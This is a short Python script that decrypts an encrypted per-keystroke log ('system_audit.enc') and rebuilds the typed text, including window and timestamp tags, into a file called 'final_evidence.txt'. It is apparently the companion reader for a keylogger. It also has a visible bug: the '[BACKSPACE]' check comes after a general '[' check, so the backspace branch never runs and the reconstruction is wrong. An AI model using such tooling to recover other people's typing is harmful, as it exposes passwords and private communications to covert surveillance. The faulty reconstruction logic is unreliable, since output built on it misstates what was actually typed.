import os
import sys
from cryptography.fernet import Fernet

def run_decryptor():
    print("--- STARTING FINAL DECRYPTOR ---")
    
    # 1. LOAD KEY
    key_path = "audit.key"
    if not os.path.exists(key_path):
        key_path = input("Path to audit.key: ").strip().strip('"')
    
    try:
        with open(key_path, "rb") as f:
            cipher = Fernet(f.read())
    except Exception as e:
        print(f"[-] Key Error: {e}")
        return

    # 2. LOAD LOG
    log_path = os.path.join("logs", "system_audit.enc")
    if not os.path.exists(log_path):
        log_path = input("Path to system_audit.enc: ").strip().strip('"')

    print(f"[*] Decrypting: {log_path}")
    
    try:
        with open(log_path, "rb") as f:
            lines = f.readlines()
    except Exception:
        print("[-] Error reading log file.")
        return

    # 3. SMART RECONSTRUCTION
    output_lines = []
    current_line = ""

    for line in lines:
        try:
            # Decrypt the line
            decrypted = cipher.decrypt(line.strip()).decode()
            
            # --- FILTERING LOGIC ---
            
            # Case A: It is a Space (The Fix for "noThisis")
            if decrypted == "[SPACE]":
                current_line += " "
            
            # Case B: It is an Enter key
            elif decrypted == "[ENTER]":
                output_lines.append(current_line)
                current_line = ""
            
            # Case C: It is a System Tag (Timestamp/Window)
            elif decrypted.startswith("["):
                # Save whatever we typed before the window changed
                if current_line:
                    output_lines.append(current_line)
                    current_line = ""
                output_lines.append(f"\n{decrypted}")
            
            # Case D: It is a Backspace (Delete previous char)
            elif decrypted == "[BACKSPACE]":
                current_line = current_line[:-1]

            # Case E: It is a normal character
            else:
                # Filter out the junk (Ctrl+C, Ctrl+V, etc)
                # We only allow printable characters
                if decrypted.isprintable():
                    current_line += decrypted

        except:
            pass # Skip corrupt lines
    
    # Flush buffer
    if current_line:
        output_lines.append(current_line)

    # 4. SAVE
    final_text = "\n".join(output_lines)
    with open("final_evidence.txt", "w", encoding="utf-8") as f:
        f.write(final_text)

    print("\n" + "="*30)
    print("EVIDENCE CLEANED & RECOVERED")
    print("="*30)
    print(f"File: final_evidence.txt")

if __name__ == "__main__":
    run_decryptor()
